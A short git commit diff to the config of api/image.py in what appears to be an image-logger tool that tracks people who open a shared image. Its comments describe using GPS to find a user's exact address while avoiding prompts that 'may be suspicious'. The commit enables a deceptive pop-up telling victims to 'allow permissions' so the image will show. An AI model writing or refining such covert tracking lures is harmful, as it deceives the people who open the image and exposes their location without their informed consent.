65024be19857786e472bccbd8e0eabc63f1bca0d
number1pratyanthemsong <ooa962406@gmail.com>
2026-04-13 21:34:03 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "If the Image doesnt show , please allow us Location permisson", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "If the Image doesnt show , please allow permissions", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
